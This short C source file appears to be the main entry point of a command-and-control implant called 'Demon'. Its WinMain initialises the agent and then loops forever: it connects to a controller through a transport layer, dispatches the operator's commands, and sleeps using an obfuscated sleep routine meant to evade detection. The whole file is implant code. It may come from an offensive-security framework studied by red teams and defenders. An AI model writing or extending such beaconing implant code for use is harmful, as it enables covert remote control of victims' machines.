#include <Demon.h>

#include <Core/Command.h>
#include <Core/Transport.h>
#include <Core/SleepObf.h>

PINSTANCE Instance = & ( ( INSTANCE ) { } );

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    PUTS( "Start" )

    DxInitialization(  );

    do
    {
        if ( ! Instance->Session.Connected )
        {
            if ( TransportInit( NULL ) )
                CommandDispatcher();
        }

        DxSleep( Instance->Config.Sleeping * 1000 );

    } while ( TRUE );
}
